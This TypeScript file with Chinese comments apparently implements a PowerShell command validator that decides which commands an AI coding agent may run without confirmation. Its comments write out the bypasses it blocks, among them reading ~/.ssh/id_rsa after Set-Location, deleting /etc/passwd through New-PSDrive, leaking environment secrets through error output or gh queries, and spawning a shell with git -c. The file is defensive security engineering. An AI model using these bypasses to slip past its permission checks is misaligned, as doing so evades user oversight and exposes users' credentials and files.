 *    后续盘符前缀路径(p:/foo)经新驱动器根解析,不经文件系统。
 *    finding #21:`New-PSDrive -Name p -Root /etc; Remove-Item p:/passwd`
 *    ——校验器无从知道 p: 映射到 /etc。
 *
 * 任何含有其中之一的复合命令,其后续语句的相对/盘符前缀路径都无法对着
 * 过期的校验器 cwd 校验。
 *
 * 名字沿用 BashTool 对齐(isCwdChangingCmdlet ↔ compoundCommandHasCd);
 * 语义上是"改变路径解析命名空间"。
 */
export function isCwdChangingCmdlet(name: string): boolean {
  const canonical = resolveToCanonical(name);
  return (
    canonical === 'set-location' ||
    canonical === 'push-location' ||
    canonical === 'pop-location' ||
    // New-PSDrive 创建的驱动器映射会把 <name>:/... 路径重定向到任意
    // 文件系统根。别名 ndr/mount 不在 COMMON_ALIASES 中——显式检查
    // (finding #21)。
    canonical === 'new-psdrive' ||
    // ndr/mount 是 Windows 上 New-PSDrive 的 PS 别名。在 POSIX 上,'mount'
    // 是原生 mount(8) 命令;按 PSDrive 创建处理会误报。(bug #15 / 评审意见)
    (process.platform === 'win32' &&
      (canonical === 'ndr' || canonical === 'mount'))
  );
}

/**
 * 检查命令名(别名解析后)是否为安全输出 cmdlet。
 */
export function isSafeOutputCommand(name: string): boolean {
  const canonical = resolveToCanonical(name);
  return SAFE_OUTPUT_CMDLETS.has(canonical);
}

/**
 * 检查命令元素是否为从 SAFE_OUTPUT_CMDLETS 移到 CMDLET_ALLOWLIST 的
 * 管道尾变换器(PIPELINE_TAIL_CMDLETS 集合),且经 isAllowlistedCommand
 * 通过其 argLeaksValue 防护。
 *
 * 供 isSafeOutputCommand 调用点的窄兜底使用——保留对 Format-Table /
 * Select-Object 等的"跳过无害管道尾"行为。不匹配整个 CMDLET_ALLOWLIST
 * ——只匹配迁移过来的变换器。
 */
export function isAllowlistedPipelineTail(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  const canonical = resolveToCanonical(cmd.name);
  if (!PIPELINE_TAIL_CMDLETS.has(canonical)) {
    return false;
  }
  return isAllowlistedCommand(cmd, originalCommand);
}

/**
 * 只读自动放行的 fail-closed 闸门。仅当 PipelineAst 的每个元素都是
 * CommandAst 时返回 true——这是我们唯一能完整校验的语句形状。其余一切
 * (赋值、控制流、表达式源、链运算符)默认 false。
 *
 * 通往 true 的单一代码路径。PowerShell 新增的 AST 类型按构造落入 false。
 */
export function isProvablySafeStatement(stmt: ParsedStatement): boolean {
  if (stmt.statementType !== 'PipelineAst') return false;
  // 空 commands → 下述循环 vacuous 通过。PowerShell 解析器保证合法源码的
  // PipelineAst.PipelineElements ≥ 1,但这个闸门是关键支点——防御解析器/
  // JSON 边角情形。
  if (stmt.commands.length === 0) return false;
  for (const cmd of stmt.commands) {
    if (cmd.elementType !== 'CommandAst') return false;
  }
  return true;
}

/**
 * 在白名单中查找命令,先解析别名。
 * 找到返回配置,否则 undefined。
 */
function lookupAllowlist(name: string): CommandConfig | undefined {
  const lower = name.toLowerCase();
  // 先直接查找
  const direct = CMDLET_ALLOWLIST[lower];
  if (direct) {
    return direct;
  }
  // 解析别名到规范名再查找
  const canonical = resolveToCanonical(lower);
  if (canonical !== lower) {
    return CMDLET_ALLOWLIST[canonical];
  }
  return undefined;
}

/**
 * 对 PowerShell 命令做基于正则的安全可疑模式同步检查。
 * 供 isReadOnly(必须同步)在 cmdlet 白名单检查之前做快速预过滤。
 * 对应 BashTool 的 checkReadOnlyConstraints——它在评估只读状态之前先
 * 检查 bashCommandIsSafe_DEPRECATED。
 *
 * 命令含有表明不应视为只读的模式时返回 true,即使 cmdlet 在白名单中。
 */
export function hasSyncSecurityConcerns(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed) {
    return false;
  }

  // 子表达式:$(...) 可执行任意代码
  if (/\$\(/.test(trimmed)) {
    return true;
  }

  // Splatting:@variable 传任意参数。真正的 splatting 只出现在 token 起点
  // ——`@` 前面是空白/分隔符/开头,而不是词中间。`[^\w.]` 排除词字符与
  // `.`,因此 `user@example.com`(邮箱)与 `file.@{u}` 不匹配,而
  // ` @splat` / `;@splat` / `^@splat` 匹配。
  if (/(?:^|[^\w.])@\w+/.test(trimmed)) {
    return true;
  }

  // 成员调用:.Method() 可调用任意 .NET 方法
  if (/\.\w+\s*\(/.test(trimmed)) {
    return true;
  }

  // 赋值:$var = ... 可修改状态
  if (/\$\w+\s*[+\-*/]?=/.test(trimmed)) {
    return true;
  }

  // 停止解析符号:--% 把之后的一切原样传给原生命令
  if (/--%/.test(trimmed)) {
    return true;
  }

  // UNC 路径:\\server\share 或 //server/share 可触发网络请求并泄露
  // NTLM/Kerberos 凭据
  // (原文此处有 eslint-disable 注释:对短命令字符串做 .test() 原子搜索,允许 lookbehind)
  if (/\\\\/.test(trimmed) || /(?<!:)\/\//.test(trimmed)) {
    return true;
  }

  // 静态方法调用:[Type]::Method() 可调用任意 .NET 方法
  if (/::/.test(trimmed)) {
    return true;
  }

  return false;
}

/**
 * 基于 cmdlet 白名单检查 PowerShell 命令是否只读。
 *
 * @param command - 原始 PowerShell 命令字符串
 * @param parsed - 命令的 AST 解析表示
 * @returns 只读返回 true,否则 false
 */
export function isReadOnlyCommand(
  command: string,
  parsed?: ParsedPowerShellCommand,
): boolean {
  const trimmedCommand = command.trim();
  if (!trimmedCommand) {
    return false;
  }

  // 无解析 AST 可用时,保守返回 false
  if (!parsed) {
    return false;
  }

  // 解析失败,拒绝
  if (!parsed.valid) {
    return false;
  }

  const security = deriveSecurityFlags(parsed);
  // 拒绝带脚本块的命令——我们无法验证其中的代码。
  // 例如 Get-Process | ForEach-Object { Remove-Item C:\foo } 看起来像安全
  // 管道,但脚本块里有破坏性代码。
  if (
    security.hasScriptBlocks ||
    security.hasSubExpressions ||
    security.hasExpandableStrings ||
    security.hasSplatting ||
    security.hasMemberInvocations ||
    security.hasAssignments ||
    security.hasStopParsing
  ) {
    return false;
  }

  const segments = getPipelineSegments(parsed);

  if (segments.length === 0) {
    return false;
  }

  // 安全:拦截含有改 cwd cmdlet(Set-Location/Push-Location/Pop-Location/
  // New-PSDrive)且同时含其他语句的复合命令。此前范围只限 cd+git,但那
  // 忽略了 isReadOnlyCommand 对 cd+读 复合命令的自动放行路径
  // (finding #27):
  //   Set-Location ~; Get-Content ./.ssh/id_rsa
  // 两个 cmdlet 都在 CMDLET_ALLOWLIST 中,没有此防护该复合命令会被自动
  // 放行。路径校验把 ./.ssh/id_rsa 对着过期的校验器 cwd(如 /project)
  // 解析,漏掉了任何 Read(~/.ssh/**) deny 规则。运行时 PowerShell 先 cd
  // 到 ~,读到 ~/.ssh/id_rsa。
  //
  // 任何含有改 cwd cmdlet 的复合命令,当其他语句可能使用相对路径时,都
  // 不能被自动归类为只读——那些路径在运行时的解析与校验时不同。BashTool
  // 有等价防护:compoundCommandHasCd 串入路径校验。
  const totalCommands = segments.reduce(
    (sum, seg) => sum + seg.commands.length,
    0,
  );
  if (totalCommands > 1) {
    const hasCd = segments.some(seg =>
      seg.commands.some(cmd => isCwdChangingCmdlet(cmd.name)),
    );
    if (hasCd) {
      return false;
    }
  }

  // 逐条语句检查——必须全部只读
  for (const pipeline of segments) {
    if (!pipeline || pipeline.commands.length === 0) {
      return false;
    }

    // 拒绝文件重定向(写文件)。`> $null` 丢弃输出,不是文件系统写,
    // 不影响只读判定。
    if (pipeline.redirections.length > 0) {
      const hasFileRedirection = pipeline.redirections.some(
        r => !r.isMerging && !isNullRedirectionTarget(r.target),
      );
      if (hasFileRedirection) {
        return false;
      }
    }

    // 第一个命令必须在白名单中
    const firstCmd = pipeline.commands[0];
    if (!firstCmd) {
      return false;
    }

    if (!isAllowlistedCommand(firstCmd, command)) {
      return false;
    }

    // 其余管道命令必须是安全输出 cmdlet,或(经参数校验)在白名单中。
    // Format-Table/Measure-Object 在安全评审发现它们都接受计算属性哈希表
    // 后从 SAFE_OUTPUT_CMDLETS 移到 CMDLET_ALLOWLIST。isAllowlistedCommand
    // 运行它们的 argLeaksValue 回调:裸 `| Format-Table` 通过,
    // `| Format-Table $env:SECRET` 失败。安全:nameType 闸门兜住
    // 'scripts\\Out-Null'(原始名字含路径字符 → 'application')。cmd.name
    // 被剥成 'Out-Null' 会匹配 SAFE_OUTPUT_CMDLETS,但 PowerShell 实际
    // 运行 scripts\\Out-Null.ps1。
    for (let i = 1; i < pipeline.commands.length; i++) {
      const cmd = pipeline.commands[i];
      if (!cmd || cmd.nameType === 'application') {
        return false;
      }
      // 安全:isSafeOutputCommand 是纯名字检查;只对零参数调用短路。
      // Out-String -InputObject:(rm x)——括号在 Out-String 运行时被求值。
      // 纯名字检查加参数会让冒号绑定的括号绕过。有参数时强制走
      // isAllowlistedCommand(参数校验)——Out-String/Out-Null/Out-Host 不在
      // CMDLET_ALLOWLIST 中,任何参数都会被拒。
      //   PoC:Get-Process | Out-String -InputObject:(Remove-Item /tmp/x)
      //   → 自动放行 → Remove-Item 运行。
      if (isSafeOutputCommand(cmd.name) && cmd.args.length === 0) {
        continue;
      }
      if (!isAllowlistedCommand(cmd, command)) {
        return false;
      }
    }

    // 安全:拒绝带嵌套命令的语句。nestedCommands 是在脚本块参数、冒号绑定
    // 参数的 ParenExpressionAst 子节点或其他非顶层位置中发现的 CommandAst
    // 节点。带 nestedCommands 的语句按定义就不是简单的只读调用——它含有
    // 可执行的子管道,会绕过上面的逐命令白名单检查。
    if (pipeline.nestedCommands && pipeline.nestedCommands.length > 0) {
      return false;
    }
  }

  return true;
}

/**
 * 检查单个命令元素是否在白名单中并通过旗标校验。
 */
export function isAllowlistedCommand(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  // 安全:nameType 由原始(剥模块前缀之前)名字计算。'application' 表示
  // 原始名字含路径字符(. \\ /)——如 'scripts\\Get-Process'、'./git'、
  // 'node.exe'。PowerShell 把它们按文件路径解析,而不是按剥后名字匹配的
  // cmdlet/命令。永不自动放行:白名单是为 cmdlet 建的,不是为任意脚本。
  // 已知误伤:'Microsoft.PowerShell.Management\\Get-ChildItem' 也会被归类为
  // 'application'(含 . 与 \\)而弹确认。可接受,因为模块限定名实践中罕见,
  // 且弹确认是安全方向。
  if (cmd.nameType === 'application') {
    // 显式安全 .exe 名的旁路(bash `which` 对齐——见 SAFE_EXTERNAL_EXES)。
    // 安全:匹配 cmd.text 的原始首个 token,而不是 cmd.name。
    // stripModulePrefix 把 scripts\where.exe 折叠成 cmd.name='where.exe',
    // 但 cmd.text 保留 'scripts\where.exe ...'。
    const rawFirstToken = cmd.text.split(/\s/, 1)[0]?.toLowerCase() ?? '';
    if (!SAFE_EXTERNAL_EXES.has(rawFirstToken)) {
      return false;
    }
    // 继续走 lookupAllowlist——CMDLET_ALLOWLIST['where.exe'] 处理旗标校验
    // (空配置 = 所有旗标放行,与 bash 的 `which` 一致)。
  }

  const config = lookupAllowlist(cmd.name);
  if (!config) {
    return false;
  }

  // 有正则约束时,对原始命令检查
  if (config.regex && !config.regex.test(originalCommand)) {
    return false;
  }

  // 有附加回调时检查
  if (config.additionalCommandIsDangerousCallback?.(originalCommand, cmd)) {
    return false;
  }

  // 安全:参数 elementTypes 白名单——只有 StringConstant 与 Parameter 是
  // 可静态验证的。其余都在运行时展开/求值:
  //   'Variable'          → `Get-Process $env:AWS_SECRET_ACCESS_KEY` 展开,
  //                         报错 "Cannot find process 'sk-ant-...'",模型
  //                         从错误中读到秘密
  //   'Other'(Hashtable)→ `Get-Process @{k=$env:SECRET}` 同样泄露
  //   'Other'(Convert)  → `Get-Process [string]$env:SECRET` 同样泄露
  //   'Other'(BinaryExpr)→ `Get-Process ($env:SECRET + '')` 同样泄露
  //   'SubExpression'     → 任意代码(已被 isReadOnlyCommand 层的
  //                         deriveSecurityFlags 兜住,但
  //                         isAllowlistedCommand 也会被 checkPermissionMode
  //                         直接调用)
  // hasSyncSecurityConcerns 漏掉裸 $var(只匹配 `$(`/@var/.Method(/$var=/
  // --%/::);deriveSecurityFlags 没有 'Variable' 分支;下方 safeFlags 循环
  // 校验旗标*名*但不校验位置参数*类型*。文件类 cmdlet(CMDLET_PATH_CONFIG)
  // 已被 pathValidation.ts 的 SAFE_PATH_ELEMENT_TYPES 保护——这里为非文件
  // 类 cmdlet(Get-Process、Get-Service、Get-Command 等约 15 个)补上缺口。
  // 等价于 Bash 在 BashTool/readOnlyValidation.ts:~1356 的一刀切 `$` token
  // 检查。
  //
  // 位置:在外部命令分发之前,git/gh/docker/dotnet 也能吃到(与它们基于
  // 字符串的 `$` 检查形成纵深防御;兜住 `$` 子串检查漏掉的 @{...}/[cast]/
  // ($a+$b))。PS 参数模式下,裸 `5` 分词为 StringConstant(BareWord),
  // 不是数字字面量,因此 `git log -n 5` 能通过。
  //
  // 安全:elementTypes 为 undefined → fail-closed。真实解析器总是设置它,
  // undefined 意味着不可信或畸形的元素。此前为照顾测试辅助而跳过
  // (fail-open);测试辅助现在显式设置 elementTypes。
  // elementTypes[0] 是命令名;参数从 elementTypes[1] 开始。
  if (!cmd.elementTypes) {
    return false;
  }
  {
    for (let i = 1; i < cmd.elementTypes.length; i++) {
      const t = cmd.elementTypes[i];
      if (t !== 'StringConstant' && t !== 'Parameter') {
        // ArrayLiteralAst(`Get-Process Name, Id`)映射为 'Other'。上面列举
        // 的泄露通道的 extent 文本都含元字符:Hashtable `@{`、Convert `[`、
        // 带变量的 BinaryExpr `$`、ParenExpr `(`。裸标识符逗号列表一样都
        // 不含。
        if (!/[$(@{[]/.test(cmd.args[i - 1] ?? '')) {
          continue;
        }
        return false;
      }
      // 冒号绑定参数(`-Flag:$env:SECRET`)是单个 CommandParameterAst——
      // VariableExpressionAst 是它的 .Argument 子节点,不是独立的
      // CommandElement,因此 elementTypes 报 'Parameter',上面的白名单通过。
      //
      // 查询解析器的 children[] 树,而不是对参数文本做字符串考古。
      // children[i-1] 保存 .Argument 子节点的映射类型(与 args[i-1] 对齐)。
      // 树查询比字符串检查抓得更多——如 `-InputObject:@{k=v}`
      // (HashtableAst → 'Other',文本中无 `$`)、`-Name:('payload' > file)`
      // (带重定向的 ParenExpressionAst)。children 为 undefined 时退化为
      // 扩展元字符检查(向后兼容 / 不设 children 的测试辅助)。
      if (t === 'Parameter') {
        const paramChildren = cmd.children?.[i - 1];
        if (paramChildren) {
          if (paramChildren.some(c => c.type !== 'StringConstant')) {
            return false;
          }
        } else {
          // 兜底:对参数文本做字符串考古(children 之前的解析器)。
          // 拒绝 `$`(变量)、`(`(ParenExpressionAst)、`@`(哈希/数组
          // 下标)、`{`(scriptblock)、`[`(类型字面量/静态方法)。
          const arg = cmd.args[i - 1] ?? '';
          const colonIdx = arg.indexOf(':');
          if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
            return false;
          }
        }
      }
    }
  }

  const canonical = resolveToCanonical(cmd.name);

  // 经共享校验处理外部命令
  if (
    canonical === 'git' ||
    canonical === 'gh' ||
    canonical === 'docker' ||
    canonical === 'dotnet'
  ) {
    return isExternalCommandSafe(canonical, cmd.args);
  }

  // Windows 上 / 是原生命令的合法旗标前缀(如 findstr /S)。但 PowerShell
  // cmdlet 总是用 - 前缀参数,因此 /tmp 是路径,不是旗标。通过检查命令是否
  // 解析为 Verb-Noun 规范名(直接或经别名)来识别 cmdlet。
  const isCmdlet = canonical.includes('-');

  // 安全:设置 allowAllFlags 时跳过旗标校验(命令的整个旗标面都是只读)。
  // 否则,缺失/空的 safeFlags 表示"仅位置参数,拒绝所有旗标"——而不是
  // "全部接受"。
  if (config.allowAllFlags) {
    return true;
  }
  if (!config.safeFlags || config.safeFlags.length === 0) {
    // 未定义 safeFlags 且未设 allowAllFlags:拒绝任何旗标。
    // 纯位置参数仍允许(下面的循环不会触发)。
    // 这是安全默认——命令必须显式选择接受旗标。
    const hasFlags = cmd.args.some((arg, i) => {
      if (isCmdlet) {
        return isPowerShellParameter(arg, cmd.elementTypes?.[i + 1]);
      }
      return (
        arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'))
      );
    });
    return !hasFlags;
  }

  // 校验用到的所有旗标都在白名单中。
  // 安全:以 elementTypes 为参数判定的 ground truth。PowerShell 的
  // tokenizer 接受 en-dash/em-dash/horizontal bar(U+2013/2014/2015)作为
  // 参数前缀;裸 startsWith('-') 检查会漏掉 `–ComputerName`(en-dash)。
  // 解析器把 CommandParameterAst 映射为 'Parameter',与破折号字符无关。
  // elementTypes[0] 是名字元素;参数从 elementTypes[1] 开始。
  for (let i = 0; i < cmd.args.length; i++) {
    const arg = cmd.args[i]!;
    // 对 cmdlet:信任 elementTypes(AST ground truth,兜住 Unicode 破折号)。
    // 对 Windows 原生 exe:还要检查 `/` 前缀(argv 约定,不经 tokenizer
    // ——解析器把 `/S` 看作位置参数,不是 CommandParameterAst)。
    const isFlag = isCmdlet
      ? isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      : arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'));
    if (isFlag) {
      // 对 cmdlet,把 Unicode 破折号规范化为 ASCII 连字符再与 safeFlags
      // 比较(safeFlags 条目一律用 ASCII `-` 书写)。原生 exe 的 safeFlags
      // 以 `/` 存储(如 '/FO')——不动。
      let paramName = isCmdlet ? '-' + arg.slice(1) : arg;
      const colonIndex = paramName.indexOf(':');
      if (colonIndex > 0) {
        paramName = paramName.substring(0, colonIndex);
      }

      // -ErrorAction/-Verbose/-Debug 等经 [CmdletBinding()] 被每个 cmdlet
      // 接受,只路由 error/warning/progress 流——它们不能让只读 cmdlet 产生
      // 写。pathValidation.ts 已把这些合并进它的逐 cmdlet 参数集
      // (约 1339 行);这里是对 safeFlags 做同样的合并。没有它,
      // `Get-Content file.txt -ErrorAction SilentlyContinue` 会在
      // Get-Content 已入白名单的情况下仍弹确认。仅对 cmdlet——原生 exe
      // 没有 common parameters。
      const paramLower = paramName.toLowerCase();
      if (isCmdlet && COMMON_PARAMETERS.has(paramLower)) {
        continue;
      }
      const isSafe = config.safeFlags.some(
        flag => flag.toLowerCase() === paramLower,
      );
      if (!isSafe) {
        return false;
      }
    }
  }

  return true;
}

// ---------------------------------------------------------------------------
// 外部命令校验(git、gh、docker),使用共享配置
// ---------------------------------------------------------------------------

function isExternalCommandSafe(command: string, args: string[]): boolean {
  switch (command) {
    case 'git':
      return isGitSafe(args);
    case 'gh':
      return isGhSafe(args);
    case 'docker':
      return isDockerSafe(args);
    case 'dotnet':
      return isDotnetSafe(args);
    default:
      return false;
  }
}

const DANGEROUS_GIT_GLOBAL_FLAGS = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  // 安全:--attr-source 制造解析差异。Git 把 tree-ish 值之后的 token 当作
  // pathspec(而不是子命令),但我们按 2 个跳过的循环会把它当作子命令:
  //   git --attr-source HEAD~10 log status
  //   校验器:跳过 HEAD~10,看到子命令=log → 放行
  //   git:     把 `log` 消费为 pathspec,把 `status` 当作真正的子命令运行
  // 已用 `GIT_TRACE=1 git --attr-source HEAD~10 log status` 验证 →
  // `trace: built-in: git status`。直接拒绝,而不是按 2 个跳过。
  '--attr-source',
]);

// 接受独立(空格分隔)值参数的 git 全局旗标。循环遇到没有内联 `=` 值的
// 这类旗标时,必须跳过下一个 token,免得值被误认作子命令。
//
// 安全:此集合必须完整。任何未列出的消费值的全局旗标都会制造解析差异:
// 校验器把值看作子命令,git 消费它并运行下一个 token。已对照 `man git`
// + GIT_TRACE(git 2.51)审计;--list-cmds 仅 `=` 形式,布尔旗标
// (-p/--bare/--no-*/--*-pathspecs/--html-path 等)经默认路径前进 1 个。
// --attr-source 已移除:它还会触发 pathspec 解析,制造第二个解析差异——
// 已移到上方 DANGEROUS_GIT_GLOBAL_FLAGS。
const GIT_GLOBAL_FLAGS_WITH_VALUES = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--super-prefix',
  '--shallow-file',
]);

// 接受 attached 形式值(旗标字母与值之间无空格)的 git 短全局旗标。
// 长选项(--git-dir 等)要求 `=` 或空格,由按 `=` 切分的检查处理。但
// `-ccore.pager=sh` 与 `-C/path` 需要前缀匹配:git 直接解析
// `-c<name>=<value>` 与 `-C<path>`。
const DANGEROUS_GIT_SHORT_FLAGS_ATTACHED = ['-c', '-C'];

function isGitSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true;
  }

  // 安全:拒绝任何含 `$` 的参数(变量引用)。裸 VariableExpressionAst 位置
  // 参数以字面文本($env:SECRET、$VAR)到达这里。deriveSecurityFlags 不设
  // 裸 Variable 参数闸门。校验器把 `$VAR` 当文本;PowerShell 在运行时展开。
  // 解析差异:
  //   git diff $VAR   其中 $VAR = '--output=/tmp/evil'
  //   → 校验器看到位置参数 '$VAR' → validateFlags 通过
  //   → PowerShell 运行 `git diff --output=/tmp/evil` → 文件写
  // 这把下方 ls-remote 的内联 `$` 防护推广到所有 git 子命令。
  // Bash 等价物:BashTool 在 readOnlyValidation.ts:~1352 的一刀切 `$`
  // 拒绝。isGhSafe 有同样防护。
  for (const arg of args) {
    if (arg.includes('$')) {
      return false;
    }
  }

  // 跳过子命令之前的全局旗标,拒绝危险旗标。
  // 带空格分隔值的旗标必须消费下一个 token,免得它被误认作子命令
  // (如 `git --namespace foo status`)。
  let idx = 0;
  while (idx < args.length) {
    const arg = args[idx];
    if (!arg || !arg.startsWith('-')) {
      break;
    }
    // 安全:attached 形式短旗标。`-ccore.pager=sh` 按 `=` 切分得
    // `-ccore.pager`,不在 DANGEROUS_GIT_GLOBAL_FLAGS 中。git 接受无空格的
    // `-c<name>=<value>` 与 `-C<path>`。必须前缀匹配。
    // 注意:`--cached`、`--config-env` 等在位置 1 已过不了 startsWith('-c')
    // (`-` ≠ `c`)。`!== '-'` 守卫只适用于 `-c`(git 配置键不会以 `-`
    // 开头,因此 `-c-key` 不现实)。它不适用于 `-C`——目录路径可以以 `-`
    // 开头,因此 `git -C-trap status` 必须拒绝。`git -ccore.pager=sh log`
    // 会起 shell。
    for (const shortFlag of DANGEROUS_GIT_SHORT_FLAGS_ATTACHED) {
      if (
        arg.length > shortFlag.length &&
        arg.startsWith(shortFlag) &&
        (shortFlag === '-C' || arg[shortFlag.length] !== '-')
      ) {
        return false;
      }
    }
    const hasInlineValue = arg.includes('=');
    const flagName = hasInlineValue ? arg.split('=')[0] || '' : arg;
    if (DANGEROUS_GIT_GLOBAL_FLAGS.has(flagName)) {
      return false;
    }
    // 旗标带独立值时消费下一个 token
    if (!hasInlineValue && GIT_GLOBAL_FLAGS_WITH_VALUES.has(flagName)) {
      idx += 2;
    } else {
      idx++;
    }
  }

  if (idx >= args.length) {
    return true;
  }

  // 先试多词子命令(如 'stash list'、'config --get'、'remote show')
  const first = args[idx]?.toLowerCase() || '';
  const second = idx + 1 < args.length ? args[idx + 1]?.toLowerCase() || '' : '';

  // GIT_READ_ONLY_COMMANDS 的键形如 'git diff'、'git stash list'
  const twoWordKey = `git ${first} ${second}`;
  const oneWordKey = `git ${first}`;

  let config: ExternalCommandConfig | undefined =
    GIT_READ_ONLY_COMMANDS[twoWordKey];
  let subcommandTokens = 2;

  if (!config) {
    config = GIT_READ_ONLY_COMMANDS[oneWordKey];
    subcommandTokens = 1;
  }

  if (!config) {
    return false;
  }

  const flagArgs = args.slice(idx + subcommandTokens);

  // git ls-remote URL 拒绝——移植自 BashTool 的内联防护
  // (src/tools/BashTool/readOnlyValidation.ts:~962)。带 URL 的 ls-remote
  // 是数据外泄通道(把秘密编码进主机名 → DNS/HTTP)。拒绝类 URL 的位置
  // 参数:`://`(http/git 协议)、`@` + `:`(SSH git@host:path)、`$`
  // (变量引用——当参数的 elementType 是 Variable 时,$env:URL 以字面
  // 字符串 '$env:URL' 到达这里;安全标志检查不设传给外部命令的裸
  // Variable 位置参数闸门)。
  if (first === 'ls-remote') {
    for (const arg of flagArgs) {
      if (!arg.startsWith('-')) {
        if (
          arg.includes('://') ||
          arg.includes('@') ||
          arg.includes(':') ||
          arg.includes('$')
        ) {
          return false;
        }
      }
    }
  }

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false;
  }
  return validateFlags(flagArgs, 0, config, { commandName: 'git' });
}

function isGhSafe(args: string[]): boolean {
  // gh 命令依赖网络;仅对内部(ant)用户开放。
  // 移植注:这是 Claude 仓库的 Anthropic 内部门禁,逐行保留。Ema 无
  // USER_TYPE=ant 环境变量,因此 gh 永不自动放行(fail-closed,弹确认)。
  if (process.env.USER_TYPE !== 'ant') {
    return false;
  }

  if (args.length === 0) {
    return true;
  }

  // 先试两词子命令(如 'pr view')
  let config: ExternalCommandConfig | undefined;
  let subcommandTokens = 0;

  if (args.length >= 2) {
    const twoWordKey = `gh ${args[0]?.toLowerCase()} ${args[1]?.toLowerCase()}`;
    config = GH_READ_ONLY_COMMANDS[twoWordKey];
    subcommandTokens = 2;
  }

  // 试单词子命令(如 'gh version')
  if (!config && args.length >= 1) {
    const oneWordKey = `gh ${args[0]?.toLowerCase()}`;
    config = GH_READ_ONLY_COMMANDS[oneWordKey];
    subcommandTokens = 1;
  }

  if (!config) {
    return false;
  }

  const flagArgs = args.slice(subcommandTokens);

  // 安全:拒绝任何含 `$` 的参数(变量引用)。裸 VariableExpressionAst 位置
  // 参数以字面文本($env:SECRET)到达这里。deriveSecurityFlags 不设裸
  // Variable 参数闸门——只管子表达式、splatting、可展开字符串等。所有 gh
  // 子命令都面向网络,因此变量参数是数据外泄通道:
  //   gh search repos $env:SECRET_API_KEY
  //   → PowerShell 运行时展开 → 秘密发往 GitHub API。
  // git ls-remote 有等价内联防护;这里把它推广到 gh。
  // Bash 等价物:BashTool 在 readOnlyValidation.ts:~1352 的一刀切 `$` 拒绝。
  for (const arg of flagArgs) {
    if (arg.includes('$')) {
      return false;
    }
  }
  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false;
  }
  return validateFlags(flagArgs, 0, config);
}

function isDockerSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true;
  }

  // 安全:一刀切拒绝 PowerShell `$` 变量。与 isGitSafe、isGhSafe 同样的
  // 防护。解析差异:校验器看到字面 '$env:X';PowerShell 运行时展开。
  // 在快速路径 return 之前运行——之前的位置(快速路径之后)对
  // `docker ps`/`docker images` 永远不会触发。此前注释声称它们不带
  // --format 是错的:`docker ps --format $env:AWS_SECRET_ACCESS_KEY`
  // 会被自动放行,PowerShell 展开后 docker 报错,秘密出现在输出中,
  // 模型读到它。检查所有 args,不只是 flagArgs——args[0](子命令位)
  // 也可能是 `$env:X`。elementTypes 白名单在此不适用:本函数收到的是
  // string[](字符串化之后),不是 ParsedCommandElement;elementTypes 闸门
  // 由 isAllowlistedCommand 调用方在上一层施加。
  for (const arg of args) {
    if (arg.includes('$')) {
      return false;
    }
  }

  const oneWordKey = `docker ${args[0]?.toLowerCase()}`;

  // 快速路径:EXTERNAL_READONLY_COMMANDS 条目('docker ps'、'docker images')
  // 没有旗标约束——无条件放行(在上方 $ 防护之后)。
  if (EXTERNAL_READONLY_COMMANDS.includes(oneWordKey)) {
    return true;
  }

  // DOCKER_READ_ONLY_COMMANDS 条目('docker logs'、'docker inspect')有逐
  // 旗标配置。与 isGhSafe 同构:查配置,然后 validateFlags。
  const config: ExternalCommandConfig | undefined =
    DOCKER_READ_ONLY_COMMANDS[oneWordKey];
  if (!config) {
    return false;
  }

  const flagArgs = args.slice(1);

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false;
  }
  return validateFlags(flagArgs, 0, config);
}

function isDotnetSafe(args: string[]): boolean {
  if (args.length === 0) {
    return false;
  }

  // dotnet 使用顶层旗标,如 --version、--info、--list-runtimes
  // 所有参数都必须在安全集合中
  for (const arg of args) {
    if (!DOTNET_READ_ONLY_FLAGS.has(arg.toLowerCase())) {
      return false;
    }
  }

  return true;
}
